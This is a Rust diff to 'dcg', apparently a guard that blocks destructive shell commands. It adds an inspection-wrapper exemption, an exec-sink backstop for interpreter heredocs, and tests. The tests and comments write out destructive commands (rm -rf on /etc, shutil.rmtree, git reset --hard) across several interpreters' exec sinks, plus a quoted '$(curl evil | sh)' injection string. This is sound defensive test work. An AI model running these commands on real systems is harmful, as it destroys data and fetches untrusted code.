@@ -1712,6 +1712,31 @@ pub fn evaluate_command_with_pack_order_deadline_at_path(
         return EvaluationResult::allowed();
     }
 
+    // Built-in inspection-wrapper exemption (dcg#132).
+    //
+    // A small, hard-coded set of "inspection wrapper" prefixes
+    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
+    // command as data rather than executing it. We must let them through
+    // before pack evaluation, or `dcg` will substring-match the destructive
+    // verb inside the analyzed argument and block the wrapper itself —
+    // exactly the false positive that filed dcg#132. Each prefix is
+    // evaluated by `command_prefix_safely_matches`, which enforces the
+    // same token-boundary + no-shell-chain-metacharacter guard used by
+    // user `command_prefix` allowlists. So a tail like
+    // `--cmd "rm -rf /"` allows through, but
+    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
+    // refuse the exemption and fall through to normal pack evaluation.
+    //
+    // We check both the raw command and the normalized form: the raw form
+    // is the agent-typed string we actually want to recognize; the
+    // normalized form is the belt-and-suspenders fallback if a future
+    // wrapper sneaks in via a path-stripped binary name.
+    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
+        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
+    {
+        return EvaluationResult::allowed();
+    }
+
     // Check exact command, prefix, and pattern allowlists (reusing normalized
     // from quick-reject). Use path-aware matching for context-aware
     // allowlisting (Epic 5). Pattern entries must additionally have
@@ -2582,6 +2607,21 @@ where
         return EvaluationResult::allowed();
     }
 
+    // Built-in inspection-wrapper exemption (dcg#132).
+    //
+    // Mirrors the check in `evaluate_command_with_pack_order_deadline_at_path`:
+    // a small hard-coded set of inspection-wrapper prefixes (e.g.
+    // `ee preflight check --cmd`) consumes the destructive command as data,
+    // not as an instruction. Without this, dcg substring-matches the
+    // destructive verb inside the analyzed argument and blocks the wrapper.
+    // See `BUILTIN_INSPECTION_WRAPPER_PREFIXES` for the safe-list and
+    // `command_prefix_safely_matches` for the anti-injection guard.
+    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
+        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
+    {
+        return EvaluationResult::allowed();
+    }
+
     // Step 7: Check legacy safe patterns (whitelist, reusing normalized from quick-reject)
     for pattern in safe_patterns {
         if pattern.is_match(&normalized) {
@@ -3040,6 +3080,78 @@ fn evaluate_heredoc(
                 graduated_response: None,
                 bypass_method: None,
             });
+        }
+
+        // Conservative exec-sink backstop (#136).
+        //
+        // Interpreter-source heredoc bodies (python -/node -/ruby/…) are masked
+        // out of the evaluator's later raw-shell rescan because this AST path is
+        // authoritative. ast-grep patterns only match specific call shapes, so an
+        // aliased / inline-imported sink (e.g. `const cp = require("child_process");
+        // cp.execSync("rm -rf /etc")`) can slip past them. Re-scan the raw body
+        // for name-anchored exec sinks called with a destructive string literal so
+        // masking never converts a real executing deletion into a false negative.
+        // Inert literals with no sink call (`print("rm -rf x")`) do not match.
+        if content
+            .target_command
+            .as_ref()
+            .is_some_and(|cmd| crate::heredoc::is_interpreter_source_heredoc_command(cmd))
+        {
+            if let Some(m) =
+                crate::ast_matcher::scan_executing_sink_fallback(&content.content, content.language)
+            {
+                if m.severity.blocks_by_default() {
+                    let (pack_id, pattern_name) = split_ast_rule_id(&m.rule_id);
+
+                    if let Some(hit) = context.allowlists.match_rule(&pack_id, &pattern_name) {
+                        if first_allowlist_hit.is_none() {
+                            let reason =
+                                format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
+                            let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
+                            *first_allowlist_hit = Some((
+                                PatternMatch {
+                                    pack_id: Some(pack_id),
+                                    pattern_name: Some(pattern_name),
+                                    severity: Some(ast_severity_to_pack_severity(m.severity)),
+                                    reason,
+                                    source: MatchSource::HeredocAst,
+                                    matched_span: mapped_span,
+                                    matched_text_preview: Some(m.matched_text_preview),
+                                    explanation: None,
+                                    suggestions: &[],
+                                },
+                                hit.layer,
+                                hit.entry.reason.clone(),
+                            ));
+                        }
+                    } else {
+                        let reason =
+                            format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
+                        let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
+                        return Some(EvaluationResult {
+                            decision: EvaluationDecision::Deny,
+                            pattern_info: Some(PatternMatch {
+                                pack_id: Some(pack_id),
+                                pattern_name: Some(pattern_name),
+                                severity: Some(ast_severity_to_pack_severity(m.severity)),
+                                reason,
+                                source: MatchSource::HeredocAst,
+                                matched_span: mapped_span,
+                                matched_text_preview: Some(m.matched_text_preview),
+                                explanation: None,
+                                suggestions: &[],
+                            }),
+                            allowlist_override: None,
+                            effective_mode: Some(crate::packs::DecisionMode::Deny),
+                            skipped_due_to_budget: false,
+                            branch_context: None,
+                            session_occurrence: None,
+                            graduated_response: None,
+                            bypass_method: None,
+                        });
+                    }
+                }
+            }
         }
     }
 
@@ -3956,6 +4068,68 @@ mod tests {
     }
 
     #[test]
+    fn git_commit_file_stdin_message_with_restore_is_allowed_136() {
+        let config = default_config();
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+
+        // `git commit -F -` reads the commit MESSAGE from stdin; a message that
+        // merely says "restore"/"reset --hard" is data, never executed, so it
+        // must not trip the core.git rules (#136 data-sink half).
+        let reset_hard = format!("{}{}", "reset --", "hard");
+        let cmd = format!("git commit -F - <<EOF\ndocs: {reset_hard} and restore notes\nEOF");
+        let result = evaluate_command(&cmd, &config, &["git"], &compiled, &allowlists);
+        assert!(
+            result.is_allowed(),
+            "commit-message heredoc body must not block: {:?}",
+            result.decision
+        );
+    }
+
+    #[test]
+    fn git_restore_after_commit_file_stdin_heredoc_still_blocks_136() {
+        let config = default_config();
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+
+        // Soundness: only the masked commit-message body is exempt. A real
+        // `git restore --worktree` chained after the heredoc terminator must
+        // still be denied.
+        let cmd = "git commit -F - <<EOF\ndocs: notes\nEOF\ngit restore --worktree .";
+        let result = evaluate_command(cmd, &config, &["git"], &compiled, &allowlists);
+        assert!(
+            result.is_denied(),
+            "git restore after the masked heredoc must still block: {:?}",
+            result.decision
+        );
+    }
+
+    #[test]
+    fn git_file_stdin_sentinel_does_not_leak_onto_later_bash_heredoc_136() {
+        let config = default_config();
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+
+        // Soundness: a `git … -F -` on an earlier line must NOT cause a later
+        // `bash <<EOF` body (which IS executed) to be masked. The heredoc binds
+        // to the command on its own physical line.
+        let rmrf = format!("{}{}{}", "rm", " -", "rf");
+        let cmd = format!("git commit -F - msg.txt\nbash <<EOF\n{rmrf} /important\nEOF");
+        let result = evaluate_command(
+            &cmd,
+            &config,
+            &["git", "bash", "rm"],
+            &compiled,
+            &allowlists,
+        );
+        assert!(
+            result.is_denied(),
+            "bash heredoc body after a git -F - line must still block: {:?}",
+            result.decision
+        );
+    }
+
+    #[test]
     fn bd_notes_with_dangerous_text_is_allowed() {
         let config = default_config();
         let compiled = default_compiled_overrides();
@@ -4594,6 +4768,376 @@ mod tests {
                 .map(|p| p.matched_text_preview.as_ref()),
             "Match text preview should be deterministic"
         );
+    }
+
+    // =========================================================================
+    // #136 REVERTED: interpreter-stdin bodies are conservatively raw-shell scanned
+    //
+    // `python3 - <<PY` / `node - <<JS` feed a *program* to an interpreter's
+    // stdin. The #136 language-aware string-literal masking (which allowed a
+    // destructive token inside an inert string/comment literal like
+    // `print("rm -rf x")`) was REVERTED (commit ebc4fc1) to restore ZERO false
+    // negatives: interpreter bodies now flow through the conservative raw-shell
+    // scan, so a destructive literal CONSERVATIVELY BLOCKS (accepted false
+    // positive). Real executing sinks (`os.system`, `subprocess.*`,
+    // `child_process.exec*`, Ruby/Perl `system`/backticks, …) of course still
+    // block. Only the `cat`/`tee` data-sink masking from #109 remains. The
+    // destructive token is assembled at runtime so this test source itself can't
+    // trip a pre-exec hook scanning the repo.
+    // =========================================================================
+
+    mod interpreter_heredoc_string_literals_136 {
+        use super::*;
+
+        const CORE: &[&str] = &["core.filesystem", "core.git"];
+
+        fn rmrf() -> String {
+            // "rm -rf" without writing the literal token in source.
+            format!("{}{}{}", "rm", " -", "rf")
+        }
+
+        fn blocked(command: &str) -> bool {
+            evaluate_with_pack_ids(command, CORE).is_denied()
+        }
+
+        // ---- Inert literals: #136 reverted, so these now CONSERVATIVELY BLOCK
+        // (interpreter bodies are raw-shell scanned; a destructive literal blocks
+        // as an accepted false positive, preserving zero false negatives). Inert
+        // *comments* are still allowed (see `python_comment_is_allowed`).
+
+        #[test]
+        fn python_print_string_literal_now_conservatively_blocked() {
+            let cmd = format!("python3 - <<PY\nprint(\"{} /etc/important\")\nPY", rmrf());
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn python_print_relative_path_literal_now_conservatively_blocked() {
+            let cmd = format!("python3 - <<PY\nimport os\nprint(\"{} build\")\nPY", rmrf());
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn python_comment_is_allowed() {
+            let cmd = format!("python3 - <<PY\n# {} /etc note\nprint(1)\nPY", rmrf());
+            assert!(!blocked(&cmd), "inert comment must not block: {cmd:?}");
+        }
+
+        #[test]
+        fn node_console_log_string_literal_now_conservatively_blocked() {
+            let cmd = format!("node - <<JS\nconsole.log(\"{} build\")\nJS", rmrf());
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn node_variable_assignment_without_sink_now_conservatively_blocked() {
+            // The destructive string is assigned and merely logged — no exec sink —
+            // but raw-shell sees the literal in the assignment and blocks.
+            let cmd = format!(
+                "node - <<JS\nconst x = \"{} /etc\"\nconsole.log(x)\nJS",
+                rmrf()
+            );
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        // ---- Executing sinks: MUST stay blocked ---------------------------
+
+        #[test]
+        fn python_os_system_real_deletion_is_blocked() {
+            let cmd = format!(
+                "python3 - <<PY\nimport os\nos.system(\"{} /etc/important\")\nPY",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "os.system exec sink must block: {cmd:?}");
+        }
+
+        #[test]
+        fn python_os_popen_real_deletion_is_blocked() {
+            let cmd = format!(
+                "python3 - <<PY\nimport os\nos.popen(\"{} /etc/important\")\nPY",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "os.popen exec sink must block: {cmd:?}");
+        }
+
+        #[test]
+        fn python_subprocess_run_shell_true_is_blocked() {
+            let cmd = format!(
+                "python3 - <<PY\nimport subprocess\nsubprocess.run(\"{} /etc/important\", shell=True)\nPY",
+                rmrf()
+            );
+            assert!(
+                blocked(&cmd),
+                "subprocess.run exec sink must block: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn node_child_process_execsync_is_blocked() {
+            let cmd = format!(
+                "node - <<JS\nchild_process.execSync(\"{} /etc/important\")\nJS",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "child_process.execSync must block: {cmd:?}");
+        }
+
+        #[test]
+        fn node_aliased_require_execsync_is_blocked() {
+            // Aliased require — slips past ast-grep call-shape patterns; the
+            // name-anchored exec-sink backstop must still catch it.
+            let cmd = format!(
+                "node - <<JS\nconst cp = require(\"child_process\")\ncp.execSync(\"{} /etc/important\")\nJS",
+                rmrf()
+            );
+            assert!(
+                blocked(&cmd),
+                "aliased require().execSync must block (backstop): {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn node_double_quote_require_execsync_is_blocked() {
+            let cmd = format!(
+                "node - <<JS\nrequire(\"child_process\").execSync(\"{} /etc/important\")\nJS",
+                rmrf()
+            );
+            assert!(
+                blocked(&cmd),
+                "double-quote require().execSync must block (backstop): {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn ruby_system_real_deletion_is_blocked() {
+            let cmd = format!("ruby - <<RB\nsystem(\"{} /etc/important\")\nRB", rmrf());
+            assert!(blocked(&cmd), "ruby system() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn perl_system_real_deletion_is_blocked() {
+            let cmd = format!("perl - <<PL\nsystem(\"{} /etc/important\");\nPL", rmrf());
+            assert!(blocked(&cmd), "perl system() must block: {cmd:?}");
+        }
+
+        // ---- #136 regression: exec-sink FNs the masking previously leaked ----
+        // PHP/Go/Perl were masked WITHOUT comprehensive exec-sink escalation, so
+        // these slipped through. They are now unmasked (conservative raw-shell
+        // scan), and Node/Ruby coverage was widened. Every case MUST block.
+
+        #[test]
+        fn php_system_real_deletion_is_blocked() {
+            let cmd = format!(
+                "php - <<PHP\n<?php system(\"{} /etc/important\"); ?>\nPHP",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "php system() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn php_shell_exec_real_deletion_is_blocked() {
+            let cmd = format!(
+                "php - <<PHP\n<?php shell_exec(\"{} /etc/important\"); ?>\nPHP",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "php shell_exec() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn php_exec_passthru_real_deletion_is_blocked() {
+            for sink in ["exec", "passthru", "popen"] {
+                let cmd = format!(
+                    "php - <<PHP\n<?php {sink}(\"{} /etc/important\"); ?>\nPHP",
+                    rmrf()
+                );
+                assert!(blocked(&cmd), "php {sink}() must block: {cmd:?}");
+            }
+        }
+
+        #[test]
+        fn go_exec_command_real_deletion_is_blocked() {
+            let cmd = format!(
+                "go run - <<GO\npackage main\nimport \"os/exec\"\nfunc main(){{ exec.Command(\"sh\",\"-c\",\"{} /etc/important\").Run() }}\nGO",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "go exec.Command() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn perl_qx_real_deletion_is_blocked() {
+            let cmd = format!("perl - <<PL\nqx({} /etc/important);\nPL", rmrf());
+            assert!(blocked(&cmd), "perl qx() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn perl_open_pipe_real_deletion_is_blocked() {
+            let cmd = format!("perl - <<PL\nopen(F,\"{} /etc/important|\");\nPL", rmrf());
+            assert!(blocked(&cmd), "perl open(\"cmd|\") must block: {cmd:?}");
+        }
+
+        #[test]
+        fn node_execfile_real_deletion_is_blocked() {
+            let cmd = format!(
+                "node - <<JS\nrequire(\"child_process\").execFile(\"sh\",[\"-c\",\"{} /etc/important\"])\nJS",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "node execFile() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn node_execfilesync_real_deletion_is_blocked() {
+            let cmd = format!(
+                "node - <<JS\nrequire(\"child_process\").execFileSync(\"sh\",[\"-c\",\"{} /etc/important\"])\nJS",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "node execFileSync() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn node_fork_real_deletion_is_blocked() {
+            let cmd = format!(
+                "node - <<JS\nrequire(\"child_process\").fork(\"{} /etc/important\")\nJS",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "node fork() must block: {cmd:?}");
+        }
+
+        // split-argv exec sinks (spawn("rm",["-rf"])) are a known pre-existing raw-shell gap, out of scope post-#136-revert.
+
+        #[test]
+        fn node_execfile_non_catastrophic_target_is_blocked() {
+            // Non-catastrophic relative target inside a real exec sink must still
+            // block (escalation to >= High).
+            let cmd = format!(
+                "node - <<JS\nrequire(\"child_process\").execFile(\"sh\",[\"-c\",\"{} myproj/data\"])\nJS",
+                rmrf()
+            );
+            assert!(
+                blocked(&cmd),
+                "node execFile() non-catastrophic target must block: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn ruby_percent_x_real_deletion_is_blocked() {
+            for cmd in [
+                format!("ruby - <<RB\n%x({} /etc/important)\nRB", rmrf()),
+                format!("ruby - <<RB\n%x{{{} /etc/important}}\nRB", rmrf()),
+                format!("ruby - <<RB\n%x[{} /etc/important]\nRB", rmrf()),
+            ] {
+                assert!(blocked(&cmd), "ruby %x command must block: {cmd:?}");
+            }
+        }
+
+        #[test]
+        fn ruby_backticks_real_deletion_is_blocked() {
+            let cmd = format!("ruby - <<RB\n`{} /etc/important`\nRB", rmrf());
+            assert!(blocked(&cmd), "ruby backticks must block: {cmd:?}");
+        }
+
+        #[test]
+        fn ruby_io_popen_real_deletion_is_blocked() {
+            let cmd = format!("ruby - <<RB\nIO.popen(\"{} /etc/important\")\nRB", rmrf());
+            assert!(blocked(&cmd), "ruby IO.popen() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn ruby_open3_real_deletion_is_blocked() {
+            let cmd = format!(
+                "ruby - <<RB\nOpen3.capture2(\"{} /etc/important\")\nRB",
+                rmrf()
+            );
+            assert!(blocked(&cmd), "ruby Open3.capture2() must block: {cmd:?}");
+        }
+
+        #[test]
+        fn ruby_system_non_catastrophic_target_is_blocked() {
+            // Non-catastrophic relative target inside a real Ruby exec sink must
+            // still block (escalation to >= High).
+            let cmd = format!("ruby - <<RB\nsystem(\"{} myproj/data\")\nRB", rmrf());
+            assert!(
+                blocked(&cmd),
+                "ruby system() non-catastrophic target must block: {cmd:?}"
+            );
+        }
+
+        // ---- #136 reverted: inert literals now CONSERVATIVELY BLOCK ----------
+        // Interpreter bodies are raw-shell scanned, so even an inert string/list
+        // literal containing a destructive token blocks (accepted false positive;
+        // zero false negatives).
+
+        #[test]
+        fn ruby_puts_string_literal_now_conservatively_blocked() {
+            let cmd = format!("ruby - <<RB\nputs(\"{} build\")\nRB", rmrf());
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn python_inert_list_literal_now_conservatively_blocked() {
+            let cmd = format!(
+                "python3 - <<PY\nx = [\"sh\",\"-c\",\"{} build\"]\nprint(x)\nPY",
+                rmrf()
+            );
+            // #136 reverted: interpreter bodies are raw-shell scanned, so a
+            // destructive literal blocks (accepted false positive; zero false
+            // negatives).
+            assert!(
+                blocked(&cmd),
+                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn python_shutil_rmtree_is_blocked() {
+            let cmd = "python3 - <<PY\nimport shutil\nshutil.rmtree(\"/etc\")\nPY";
+            assert!(blocked(cmd), "shutil.rmtree must block: {cmd:?}");
+        }
+
+        // ---- Shell heredocs are NOT a non-shell interpreter: stay blocked --
+
+        #[test]
+        fn bash_heredoc_real_deletion_stays_blocked() {
+            let cmd = format!("bash <<SH\n{} /etc/important\nSH", rmrf());
+            assert!(
+                blocked(&cmd),
+                "bash heredoc shell body must stay blocked: {cmd:?}"
+            );
+        }
+
+        #[test]
+        fn cat_sink_string_literal_is_allowed() {
+            let cmd = format!("cat > f.py <<PY\nprint(\"{} build\")\nPY", rmrf());
+            assert!(!blocked(&cmd), "cat data sink must not block: {cmd:?}");
+        }
     }
 
     // =========================================================================
